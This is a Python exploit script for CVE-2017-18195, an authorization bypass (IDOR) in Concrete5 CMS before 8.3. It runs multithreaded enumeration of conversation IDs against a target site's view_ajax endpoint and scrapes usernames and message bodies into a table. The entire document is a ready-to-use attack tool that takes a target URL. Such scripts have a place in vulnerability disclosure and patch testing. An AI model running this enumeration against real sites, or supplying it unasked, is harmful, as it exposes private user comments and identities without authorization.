 
# Concrete5 < 8.3 vulnerable to Authorization Bypass Through User-Controlled Key (IDOR)
# CVE-2017-18195
# Chapman (R3naissance) Schleiss
 
from queue import Queue
from threading import Thread
from bs4 import BeautifulSoup
from tabulate import tabulate
import argparse
import requests
import logging
 
parser = argparse.ArgumentParser(
    description="This script attempts to enumerate all comments from a vulnerable Concrete5 CMS.",
)
parser.add_argument(&#039;-u&#039;,&#039;--url&#039;, action=&#039;store&#039;, dest=&#039;url&#039;, required=True,
                    help="This is the url to attack. Typically http://example.com/index.php/tools/required/conversations/view_ajax")
parser.add_argument(&#039;-s&#039;,&#039;--start&#039;, action=&#039;store&#039;, type=int, dest=&#039;start_id&#039;,
                    help=&#039;Where to start enumeration&#039;)
parser.add_argument(&#039;-e&#039;,&#039;--end&#039;, action=&#039;store&#039;, type=int, dest=&#039;end_id&#039;,
                    help=&#039;Where to end enumeration&#039;)
parser.add_argument(&#039;-v&#039;,&#039;--verbose&#039;, action=&#039;store_true&#039;, dest=&#039;verbose&#039;,
                    help=&#039;This boolean flag will trigger all raw information to stdout&#039;)
args = parser.parse_args()
 
if args.verbose:
    logging.basicConfig(level=logging.DEBUG, format=&#039;[%(levelname)s] - %(threadName)s - %(message)s&#039;)
else:
    logging.basicConfig(level=logging.INFO, format=&#039;[%(levelname)s] %(message)s&#039;)
 
if args.start_id is None:
    args.start_id = 1
if args.end_id is None:
    args.end_id = 10
 
def crawl(q, result):
    while not q.empty():
        work = q.get()
        logging.debug("Requesting cnvID: " + str(work))
        try:
            response = requests.post(args.url, data={&#039;cnvID&#039;: work, &#039;cID&#039;: 1}, timeout=300)
            logging.debug("Requested cnvID: %s [%s]", str(work), str(response.status_code))
            if response.status_code < 400 or response.status_code > 499:
                logging.debug("Parsing html and adding comments to results list")
                soup = BeautifulSoup(response.text, &#039;html.parser&#039;)
                username = soup.find_all(&#039;span&#039;, {&#039;class&#039;: &#039;ccm-conversation-message-username&#039;})
                message = soup.find_all(&#039;div&#039;, {&#039;class&#039;: &#039;ccm-conversation-message-body&#039;})
                for i in range(len(username)):
                    results.append((work, username[i].text.strip(), message[i].text.strip()))
            logging.info("Completed cnvID: " + str(work))
        except:
            logging.error(&#039;Error getting cnvID: &#039; + str(work))
        q.task_done()
    return True
 
q = Queue(maxsize=0)
 
enum = range(args.start_id, args.end_id + 1)
num_theads = min(50, len(enum))
 
results = []
for i in enum:
    q.put(i)
 
for i in range(num_theads):
    logging.debug(&#039;Starting thread &#039; + str(i))
    worker = Thread(target=crawl, args=(q, results), name="Thread: " + str(i))
    worker.setDaemon(True)
    worker.start()
 
logging.debug(&#039;Waiting for final threads to complete&#039;)
q.join()
 
logging.info(&#039;Enumeration complete&#039;)
 
print(tabulate(results, headers=(&#039;cnvID&#039;, &#039;username&#039;, &#039;message&#039;), tablefmt=&#039;grid&#039;))

